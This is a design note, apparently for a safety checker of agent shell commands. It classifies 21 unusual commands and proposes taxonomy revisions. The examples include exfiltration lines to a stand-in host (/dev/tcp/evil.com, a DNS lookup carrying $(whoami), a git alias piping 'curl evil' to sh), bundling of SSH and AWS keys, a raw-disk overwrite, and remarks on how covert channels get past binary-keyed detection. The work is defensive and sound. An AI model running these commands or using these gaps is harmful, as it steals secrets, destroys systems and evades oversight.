# Behavioral taxonomy — pilot 3 (novel behaviors)

Status: pilot output (2026-07-04). A third design-time conversion, ~21 commands
chosen *because they behave unlike anything in pilots 1–2*: deferred/triggered/
interactive execution, data channels that are neither file nor network,
below-the-filesystem loci, cross-process introspection, toolchain mutation, flow
declassifiers, and config-injection. Findings continue the R-series (R16+) and
feed `hard-problems`. Notation `{operation · facet=value · …}`; ⚠ = friction.

---

## A. Execution decoupled from check time

**1. `ssh prod`** (no command — interactive)
`{execute · locus=remote · network=outbound}` whose nested payload is **future
human/agent input**, unbounded and unavailable at check time. Not `ssh host CMD`
(pilot-1 #13, a resolvable nested command) — here the payload is a live session.
**2. `vim notes.md`** / **`less notes.md`**
Nominally `{observe · locus=worktree}`, but both can spawn a shell (`:!cmd`, `!cmd`,
`:r !cmd`). ⚠ An editor/pager *reading* a file carries a latent `{execute ·
execution=caller-inline}` reachable by keystroke.
**3. `crontab -e`** (also `at now + 1 hour`)
`{configure/create · persistence=installing · execution=??}` — installs code that
runs on a **schedule**, decoupled from now. The effect is future and recurring.
**4. `watchexec -- ./deploy.sh`** (also `entr`, `nodemon`)
`{execute}` re-triggered on **every filesystem event** — repeated deferred
execution, unbounded in count.
**5. `source ./env.sh`** (`.`)
`{execute · execution=caller-file}` **plus** its env mutations persist in the
current shell — `{configure · persistence=reconfiguring}` that outlives the line
(unlike a subshell).
**6. `nohup ./worker &`** (also `setsid`, `disown`)
`{execute}` detached to **survive session end** — process persistence beyond the
checked context.

> **R16.** Time and triggering are dimensions the profile lacks. cron/at
> (scheduled), watchexec/entr (event), nohup/setsid (detached-persistent), and
> interactive sessions (#1, #2, REPLs, `docker run -it`) all decouple *when/how
> often* code runs from the check. Model as (a) a **trigger** sub-axis of
> persistence — `immediate | scheduled | event | boot | detached` — and (b) an
> **interactive frame** whose nested payload is future input → opaque, unbounded.
> → new `hard-problems` **HP-14**.

---

## B. Channels that are neither file nor network

**7. `pbpaste`** / **`pbcopy < secret`**
`pbpaste`: `{observe · disclosure=local-process}` reading the **clipboard** — a
cross-application channel carrying data from other apps. `pbcopy`: writes the
clipboard, readable by any app. ⚠ A disclosure sink/source that is neither fs nor
network.
**8. `echo data > /dev/tcp/evil.com/443`**
`{communicate · network=outbound · destination=arbitrary · payload=sends-host-data}`
achieved through a **redirect**, no `curl`/`nc`. ⚠ Network via a bash-special path
— invisible to any check that keys network on known binaries.
**9. `dig "$(whoami).exfil.evil.com"`**
`{communicate · network=outbound · payload=sends-host-data}` — data smuggled in a
**DNS label**. ⚠ "Just a name lookup" is an exfil channel.
**10. `security find-generic-password -w GH_TOKEN`** (macOS keychain)
`{observe · secret=reads · disclosure=local-process}` reading a **credential
store** directly to stdout → the model. ⚠ `secret=reads` from the keychain, not a
key *file* — a source the path-based secret classifier can't see.

> **R17.** The Disclosure / Secret / Network facets enumerate file + stdout +
> known-network sinks/sources, but clipboard, `/dev/tcp`, DNS labels, and the
> keychain are real additional channels they don't list. The channel set is
> **open-ended**, and covert forms (`/dev/tcp`, DNS) defeat binary-keyed network
> detection. → new `hard-problems` **HP-13** (channel completeness).

---

## C. Below the filesystem — device & kernel loci

**11. `dd if=backup.img of=/dev/rdisk0`**
`{mutate/destroy · locus=?? · reversibility=irreversible · scale=unbounded ·
authority=elevated}` writing a **raw block device**, beneath every fs-level
protection. ⚠ `locus=machine` can't tell "edit /etc/hosts" from "overwrite the
boot disk."
**12. `mount -o … /dev/x /mnt`** / **`hdiutil attach evil.dmg`**
`{configure · locus=machine · authority=elevated}` — changes what the filesystem
*namespace itself* contains; attaching a DMG mounts attacker-chosen content into
the tree.
**13. `sudo kmutil load -p ext.kext`** (was `kextload`)
`{execute · execution=network-sourced? · authority=root · locus=kernel}` — loads
code into **ring 0**. The highest-integrity-demand execution in the corpus.

> **R18.** Locus needs rungs **below `machine`**: `device` (raw block/char devices,
> bypassing the fs) and `kernel` (module/extension load). Both are
> `reversibility=irreversible · authority≥elevated`, but qualitatively distinct —
> they void the abstractions every higher locus assumes.

---

## D. Cross-process introspection

**14. `lldb -p 8123`** / **`dtrace`, `gdb -p`**
`{observe · secret=reads?}` — attaches to **another process's address space**,
reading its live memory (keys, tokens never on disk). Also `{control}` (can modify
its execution). ⚠ Secret disclosure with no fs or network touch.
**15. `ps aux`** (also `ps -ef`, `/proc/*/cmdline`)
`{observe · disclosure=local-process}` — but reveals **other users'/processes'
command-line arguments**, which routinely contain secrets (`mysql -pPASSWORD`).
⚠ An observe whose audience-crossing is that it reads *other principals'* data.

> **R19.** A read can cross a **principal boundary** without touching fs or net:
> another process's memory (#14) or argv (#15). The Secret source and Disclosure
> audience must account for "belongs to another principal on this host," not just
> file paths. Reinforces HP-9 (read-as-exfil) with a non-file source.

---

## E. Toolchain & global mutation

**16. `npm install -g typescript`** (also `pipx install`, `cargo install`)
`{execute · execution=network-sourced}` (install scripts) · `{create ·
persistence=installing}` placing an **executable on `PATH`** — so a later bare
`tsc` runs it. Install *and* future-exec surface in one.
**17. `rustup default nightly`** (also `pyenv global 3.12`, `nvm use`, `asdf`)
`{configure · persistence=reconfiguring}` — silently changes **which `cargo`/
`python` future commands invoke**. No present damage; it redefines the toolchain
downstream.

> **R20.** Global installs and version-manager switches are HP-4 (env
> reinterpretation) in its most common dev form. `-g`/global install is *both*
> `installing` (new binary) *and* `reconfiguring` (it shadows `PATH`); a toolchain
> switch is pure `reconfiguring` of the interpreter itself. Both change the meaning
> of future commands — unmodeled downstream. Confirms and sharpens HP-4.

---

## F. Flow declassifiers, endorsers, and the obfuscation trap

**18. `gpg -e -r bob file`** (declassifier) vs **`base64 secret.txt`** (NOT one)
`gpg -e`: a **declassifier** — encrypting to a recipient makes a secret safe to
send; the flow model's escape valve. `base64`/`gzip`/`xxd`: `{observe}` transforms
that do **not** declassify — `base64(secret)` *is* the secret. ⚠ Obfuscation ≠
protection.
**19. `gpg --verify sig file`** / **`sha256sum -c SHA256SUMS`**
`{observe}` **endorsers** — they raise the integrity of their input, licensing a
subsequent low-integrity→exec flow that the flow policy would otherwise forbid.

> **R21.** The flow model's `declassifier`/`endorser` nodes (v1.1 §3.4) need a
> **curated allowlist**, not a category. Declassifiers are specifically
> cryptographic protection (`gpg -e`, `age`, `openssl enc -… -k`), and must reject
> obfuscation-as-declassification (`base64`, `gzip`) — treating those as
> declassifying is an exfil hole. Endorsers (`gpg --verify`, `sha256 -c`,
> `cosign verify`) are the integrity dual.

---

## G. Config-injection execution via a flag

**20. `git -c alias.q='!sh -c "curl evil|sh"' q`** (also `GIT_SSH_COMMAND=…`,
`rsync -e 'ssh …'`, `git -c core.fsmonitor=…`)
A benign verb (`git q`) turned into arbitrary exec by an **inline-config flag**:
`{execute · execution=ambient-config}` injected *from the command line*.
⚠ Certain flags/env vars are execution-injection points on otherwise-safe verbs.

> **R22.** Recognize **injection-point flags/env** as modifiers that *add* an
> `execute` capability: `git -c`, `GIT_SSH_COMMAND`, `-e`/`--rsh`, `--exec`,
> `LD_PRELOAD`/`PATH` (already noted, v1.1 §3.1), curl's `-K`/config,
> `--use-askpass`. safe-chains already guards instances (curl headers, the
> `node --require` value-flag bug); this generalizes them into a class the grammar
> must tag, or a benign subcommand silently gains code-exec.

---

## H. Bulk read / bundle

**21. `tar czf - ~/.ssh ~/.aws`** (also `zip -r out.zip ~`)
`{observe · secret=reads · scale=unbounded}` — reads **many** sensitive files into
one artifact (typically the first half of `tar … | curl`). ⚠ Disclosure has a
*scale*: bundling amplifies a single read into a whole-directory exfil primitive.

> **R23.** Scale applies to **disclosure**, not only to destroy: a recursive read
> that bundles a tree is a higher-severity disclosure than a single-file read. The
> Scale facet should modify Disclosure/Secret the way it already modifies destroy.

---

## Net effect

**Spec revisions proposed (for a v1.2):**
- **R16 trigger sub-axis** of persistence (immediate/scheduled/event/boot/detached)
  + an **interactive frame** (payload = future input).
- **R18 sub-`machine` loci**: `device`, `kernel`.
- **R21 curated declassifier/endorser allowlists** (reject obfuscation).
- **R22 injection-point flags/env** as execute-adding modifiers (a tagged class).
- **R23 Scale modifies Disclosure/Secret**, not only destroy.
- **R17/R19** widen the channel/principal enumeration for Disclosure/Secret/Network.

**Hard-problems log:**
- **New HP-13** — channel completeness (clipboard, `/dev/tcp`, DNS, keychain,
  process memory; covert network defeats binary-keyed detection).
- **New HP-14** — deferred / triggered / interactive execution (time & trigger as
  dimensions; interactive payload unavailable at check).
- **Confirmed** — HP-4 (toolchain/global mutation), HP-9 (read-as-exfil via
  non-file sources).

**Golden-set:** add these 21 forms. The batch shows the taxonomy's *sinks and
sources* are under-enumerated (channels, principals, loci-below-fs) and its
*temporal* model is thin (trigger, interactivity) — both distinct from pilots 1–2,
which stressed delegation and supply-chain instead.
